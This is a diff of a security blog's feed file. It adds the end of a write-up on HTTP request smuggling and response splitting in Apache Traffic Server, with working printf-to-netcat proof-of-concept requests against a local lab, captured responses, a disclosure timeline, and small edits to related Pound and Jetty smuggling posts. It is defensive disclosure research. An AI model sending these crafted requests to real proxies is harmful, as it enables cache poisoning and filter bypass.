+&lt;p&gt;Does this work on port 8001 with HaProxy? well, no, of course. Our header syntax &lt;strong&gt;is invalid&lt;/strong&gt;. You would need to hide the bad query syntax from HaProxy, maybe using another smuggling issue, to hide this bad request in a body. Or you would need a load balancer which does not detect this invalid syntax. Note that in this example the nginx behavior on invalid header syntax (ignore it) is also not standard (&lt;a href=&quot;https://trac.nginx.org/nginx/ticket/1014&quot;&gt;and wont be fixed, AFAIK&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;This invalid space prefix problem is the same issue as Apache httpd in &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2016-8743&quot;&gt;CVE-2016-8743&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2&gt;HTTP Response Splitting: Content-Length Ignored on Cache Hit&lt;/h2&gt;
+
+&lt;p&gt;Still there? Great! Because now is the nicest issue.&lt;/p&gt;
+
+&lt;p&gt;At least for me it was the nicest issue. Mainly because I&#39;ve spend a lot of time around it without understanding it.&lt;/p&gt;
+
+&lt;p&gt;I was fuzzing ATS, and my fuzzer detected issues. Trying to reproduce I had failures, and success on previoulsy undetected issues, and back to step1. Issues you cannot reproduce, you start doubting that you saw it before. Suddenly you find it back, but then no, etc. And of course I was not searching the root cause on the right examples. I was for example triggering tests on bad chunked transmissions, or delayed chunks.&lt;/p&gt;
+
+&lt;p&gt;It was very a long (too long) time before I detected that all this was linked to the &lt;strong&gt;cache hit/cache miss&lt;/strong&gt; status of my requests.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;On cache Hit Content-Length header on a GET query is not read.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;That&#39;s so easy when you know it... And exploitation is also quite easy.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;We can hide a second query in the first query body, and on cache Hit this body becomes a new query.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;This sort of query will get one response first (and, yes, that&#39;s only one query), on a second launch it will render two responses (so an HTTP request Splitting by definition):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;01 GET /index.html?cache=zorg42 HTTP/1.1\r\n
+02 Host: dummy-host7.example.com\r\n
+03 Cache-control: max-age=300\r\n
+04 Content-Length: 71\r\n
+05 \r\n
+06 GET /index.html?cache=zorg43 HTTP/1.1\r\n
+07 Host: dummy-host7.example.com\r\n
+08 \r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Line &lt;strong&gt;04&lt;/strong&gt; is ignored on cache hit (only after the first run, then),
+after that line &lt;strong&gt;06&lt;/strong&gt; is now a new query and not just the 1st query body.&lt;/p&gt;
+
+&lt;p&gt;This HTTP query is valid, &lt;strong&gt;THERE IS NO invalid HTTP syntax present.&lt;/strong&gt;
+So it&#39;s quite easy to perform a successful complete Smuggling attack from this issue, even using HaProxy in front of ATS.&lt;/p&gt;
+
+&lt;p&gt;If HaProxy is configured to use a keep-alive connection to ATS we can fool the HTTP stream of HaProxy by sending a pipeline of two queries where ATS sees 3 queries:&lt;/p&gt;
+
+&lt;h3&gt;Attack schema&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;[ATS HTTP-Splitting issue on Cache hit + GET + Content-Length]
+Something        HaProxy           ATS            Nginx
+    |--A-----------&amp;gt;|               |               |
+    |               |--A-----------&amp;gt;|               |
+    |               |               |--A-----------&amp;gt;|
+    |               |            [cache]&amp;lt;--A--------|
+    |               | (etc.) &amp;lt;------|               | warmup
+---------------------------------------------------------
+    |               |               |               | attack
+    |--A(+B)+C-----&amp;gt;|               |               |
+    |               |--A(+B)+C-----&amp;gt;|               |
+    |               |             [HIT]             | * Bug *
+    |               |&amp;lt;--A-----------|               | * B &#39;discovered&#39; *
+    |&amp;lt;--A-----------|               |--B-----------&amp;gt;|
+    |               |               |&amp;lt;-B------------|
+    |               |&amp;lt;-B------------|               |
+ [ouch]&amp;lt;-B----------|               |               | * wrong resp. *
+    |               |               |--C-----------&amp;gt;|
+    |               |               |&amp;lt;--C-----------|
+    |              [R]&amp;lt;--C----------|               | rejected
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;First, we need to init cache, we use port 8001 to get a stream HaProxy-&gt;ATS-&gt;Nginx.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /index.html?cache=cogip2000 HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host: dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Cache-control: max-age=300\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-Length: 0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;nc -q &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 127.0.0.1 8001&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;You can run it two times and see that on a second time it does not reach the nginx &lt;code&gt;access.log&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Then we attack HaProxy, or any other cache set in front of this HaProxy.
+We use a pipeline of &lt;strong&gt;2 queries&lt;/strong&gt;, ATS will send back &lt;strong&gt;3 responses&lt;/strong&gt;.
+If a keep-alive mode is present in front of ATS there is a security problem.
+Here it&#39;s the case because we do not use &lt;code&gt;option: http-close&lt;/code&gt; on HaProxy (which would prevent usage of pipelines).&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /index.html?cache=cogip2000 HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host: dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Cache-control: max-age=300\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-Length: 74\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /index.html?evil=cogip2000 HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host: dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;GET /victim.html?cache=zorglub HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;Host: dummy-host7.example.com\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;nc -q &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 127.0.0.1 8001&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Query for &lt;code&gt;/victim.html&lt;/code&gt; (should be a 404 in our example) gets response for &lt;code&gt;/index.html&lt;/code&gt; (&lt;code&gt;X-Location-echo: /index.html?evil=cogip2000&lt;/code&gt;).&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;ATS/7.1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Fri, 26 Oct 2018 16:05:41 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;text/html&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;120&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Last-Modified&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Fri, 26 Oct 2018 14:16:28 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;ETag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;&amp;quot;5bd321bc-78&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Location-echo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;/index.html?cache=cogip2000&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Default-VH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;public, max-age=300&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Ranges&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;bytes&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Age&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;12&lt;/span&gt;
+
+$&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;Nginx default static page&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Hello World&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;It works!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;ATS/7.1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Fri, 26 Oct 2018 16:05:53 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;text/html&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;120&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Last-Modified&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;Fri, 26 Oct 2018 14:16:28 GMT&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;ETag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;&amp;quot;5bd321bc-78&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Location-echo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;/index.html?evil=cogip2000&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Default-VH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;public, max-age=300&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Ranges&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;bytes&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Age&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;0&lt;/span&gt;
+
+$&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;Nginx default static page&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Hello World&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;It works!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Here the issue is &lt;strong&gt;critical&lt;/strong&gt;, especially because &lt;strong&gt;there is not invalid syntax in the attacking query&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;We have an HTTP response splitting, this means two main impacts:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;ATS may be used to poison or hurt an actor used in front of it&lt;/li&gt;
+&lt;li&gt;the second query is hidden (that&#39;s a body, binary garbage for an http actor), so any security filter set in front of ATS
+cannot block the 2nd query. We could use that to hide a second layer of attack
+like an ATS cache poisoning as described in the other attacks. Now that you have a working lab you can try embedding several layers of attacks...&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;p&gt;That&#39;s what the &lt;strong&gt;Drain the request body if there is a cache hit&lt;/strong&gt; fix is about.&lt;/p&gt;
+
+&lt;p&gt;Just to better understand &lt;em&gt;real world impacts&lt;/em&gt;, here the only one receiving response B instead of C is the attacker. HaProxy is not a cache, so the mix C-request/B-response on HaProxy is not a real direct threat. But if there is a cache in front of HaProxy, or if we use several chained ATS proxies...&lt;/p&gt;
+
+&lt;h2&gt;Timeline&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;2017-12-26: Reports to project maintainers&lt;/li&gt;
+&lt;li&gt;2018-01-08: Acknowledgment by project maintainers&lt;/li&gt;
+&lt;li&gt;2018-04-16: Version 7.1.3 with most of the fix&lt;/li&gt;
+&lt;li&gt;2018-08-04: Versions 7.1.4 and 6.2.2 (officially containing all fixs, and some other CVE fixs)&lt;/li&gt;
+&lt;li&gt;2018-08-28: &lt;a href=&quot;https://lists.apache.org/thread.html/7df882eb09029a4460768a61f88a30c9c30c9dc88e9bcc6e19ba24d5@%3Cusers.trafficserver.apache.org%3E&quot;&gt;CVE announce&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;2019-10-17: This article&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;h2&gt;See also&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Video &lt;a href=&quot;https://www.youtube.com/watch?v=dVU9i5PsMPY&quot;&gt;Defcon 24: HTTP Smuggling&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Regilero-Hiding-Wookiees-In-Http.pdf&quot;&gt;Defcon support&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Video &lt;a href=&quot;https://www.youtube.com/watch?v=lY_Mf2Fv7kI&quot;&gt;Defcon demos&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+				<published>2019-10-17 00:00:00 +0200</published>
+				<link>http://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/</link>
+			</item>
+		
+			<item>
 				<title>Security: HTTP Smuggling, Jetty</title>
 				<description>&lt;p&gt;&lt;small&gt;&lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; sur &lt;a href=&quot;https://www.makina-corpus.com/blog/metier/2019/contrebande-de-http-http-smuggling-jetty&quot;&gt;makina corpus&lt;/a&gt;).&lt;/small&gt;
 &lt;small&gt;estimated read time: 15min&lt;/small&gt;&lt;/p&gt;
@@ -389,7 +1304,7 @@ HTTP/1.1 200 OK
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://regilero.github.io/security/english/2015/10/04/http_smuggling_in_2015_part_one/&quot;&gt;basics of HTTP Smuggling&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;[Pound SSl terminator smuggling issues] (http://regilero.github.io/security/english/2018/07/03/security_pound_http_smuggling/)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://regilero.github.io/security/english/2018/07/03/security_pound_http_smuggling/&quot;&gt;Pound SSl terminator smuggling issues&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Video &lt;a href=&quot;https://www.youtube.com/watch?v=dVU9i5PsMPY&quot;&gt;Defcon HTTP Smuggling&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Regilero-Hiding-Wookiees-In-Http.pdf&quot;&gt;Defcon support&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Video &lt;a href=&quot;https://www.youtube.com/watch?v=lY_Mf2Fv7kI&quot;&gt;Defcon demos&lt;/a&gt;&lt;/li&gt;
@@ -530,7 +1445,7 @@ chunked transmission has the priority on any Content-Length headers.&lt;/p&gt;
 &lt;/ul&gt;
 
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# 2 responses instead of 3&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# 2 responses instead of 3&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-length:56\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
@@ -614,7 +1529,7 @@ but sometimes the parser does not detect the NULL character because the parsed l
 
 &lt;p&gt;With Pound as soon as a NULL character was encountered in an header line the parser would continue the header with the next line.&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-\0dummy: foo\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
@@ -639,7 +1554,7 @@ but sometimes the parser does not detect the NULL character because the parsed l
 used if the previous actor in the chain of proxies had no support for double
 Content-Length (very likely).. but had support for NULL characters (less likely).&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-\0dummy: foo\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
@@ -659,7 +1574,7 @@ Content-Length (very likely).. but had support for NULL characters (less likely)
 
 &lt;p&gt;On each attack we 2 responses instead of 3, you can also make 3 responses instead of 2.&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# 3 responses instead of 2 (2nd query is unmasked by pound)&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# 3 responses instead of 2 (2nd query is unmasked by pound)&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-\0Mode: magic\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
@@ -684,7 +1599,7 @@ Content-Length (very likely).. but had support for NULL characters (less likely)
 On the first one we try a bad chunked transmission, and on the last one we use the &lt;code&gt;ops-fold&lt;/code&gt; syntax.
 Use wireshark to compare the behaviors and some potential &lt;em&gt;crafted headers&lt;/em&gt; syntax transmitted to backends.&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# chunk mode not applied&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# chunk mode not applied&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-\0Mode: magic\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
@@ -707,7 +1622,7 @@ Use wireshark to compare the behaviors and some potential &lt;em&gt;crafted head
 
 
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# chunk mode applied, and &amp;#39;\r\n zorg\r\n&amp;#39; ops-fold transmitted&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# chunk mode applied, and &amp;#39;\r\n zorg\r\n&amp;#39; ops-fold transmitted&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-\0Mode: magic\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
@@ -1361,7 +2276,7 @@ PDF by giving the full encoded image as a data uri parameter.&lt;/p&gt;
 
 &lt;p&gt;The old trick for dompdf images was using HTML sources in this form:&lt;/p&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;data:image/jpeg;base64,HERE_SOME_BASE64_ENCODED_BINARY_THINGS&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
